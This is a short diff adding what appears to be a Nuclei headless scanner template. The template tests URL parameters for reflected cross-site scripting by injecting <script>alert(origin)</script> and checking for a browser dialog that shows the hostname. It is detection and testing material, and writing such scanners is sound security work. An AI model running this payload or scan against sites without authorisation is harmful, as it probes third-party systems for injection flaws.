@@ -1,0 +1,33 @@
+id: reflected-xss-into-html-context-with-nothing-encoded
+info:
+  name: Reflected XSS into HTML context with nothing encoded
+  author: quanghuy2309 and Google AI
+  severity: high
+  description: Tests parameter names from a file for reflected XSS using a fixed payload (<script>alert(origin)</script>), checked via headless browser dialog and hostname verification. Uses headless protocol directly with payloads.
+  tags: xss,headless,reflected,hostname-check,payload,get
+
+headless:
+  - payloads:
+      param_name: params.txt
+
+    steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}/?{{param_name}}=<script>alert(origin)</script>"
+
+      - action: waitdialog
+        name: dialog_popup
+        args:
+          max-duration: 1s
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: dialog_popup
+        words:
+          - "true"
+
+      - type: word
+        part: dialog_popup_message
+        words:
+          - "{{Hostname}}"
